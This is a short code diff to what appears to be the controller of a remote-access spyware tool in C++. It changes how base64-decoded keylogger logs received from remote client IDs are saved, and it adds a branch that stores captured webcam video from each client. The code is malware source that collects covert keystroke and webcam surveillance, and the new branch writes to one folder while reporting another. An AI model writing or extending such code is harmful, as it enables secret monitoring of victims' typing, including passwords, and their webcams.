@@ -228,10 +228,17 @@ void MyCurl::AdminProcess(const vector<string> IDs, const int query, vector<stri
 					}
 					else if (query == 24) {
 						subContent = base64_decode(subContent);
-						fstream file(ComPath + "Keylogger/keylogger" + receiverID, ios::out | ios::binary);
+						fstream file(ComPath + "Keylogger/keylogger" + receiverID + ".txt", ios::out | ios::binary);
 						file << subContent;
 						file.close();
-						cout << "Saved copy file of " + receiverID + " at " + ComPath + "Keylogger/keylogger" + receiverID << endl;
+						cout << "Saved copy file of " + receiverID + " at " + ComPath + "Keylogger/keylogger" + receiverID + ".txt"  << endl;
+					}
+					else if (query == 27) {
+						subContent = base64_decode(subContent);
+						fstream file(ComPath + "Keylogger/webcam" + receiverID + ".avi", ios::out | ios::binary);
+						file << subContent;
+						file.close();
+						cout << "Saved video file of " + receiverID + " at " + ComPath + "Webcam/webcam" + receiverID + ".avi" << endl;
 					}
 					if (subContent == "N") {
 						failedClientIDs.push_back(receiverID);
